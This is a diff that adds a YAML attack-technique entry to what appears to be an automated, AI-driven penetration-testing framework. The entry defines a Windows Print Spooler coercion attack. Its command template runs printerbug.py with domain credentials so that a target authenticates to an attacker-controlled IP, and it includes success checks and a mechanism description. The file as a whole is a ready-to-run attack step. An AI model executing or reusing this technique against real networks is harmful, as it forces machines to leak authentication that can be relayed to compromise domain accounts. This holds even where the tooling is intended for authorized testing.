@@ -1,0 +1,16 @@
+name: spoolsample
+category: services
+description: Print Spooler coercion (SpoolSample)
+preconditions:
+  - os==windows
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "python3 printerbug.py '{domain}/{username}:{password}@{target_ip}' {attacker_ip}"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "MS-RPRN RpcRemoteFindFirstPrinterChangeNotificationEx: forces target to authenticate to attacker on port 445. Requires Print Spooler service running on target."
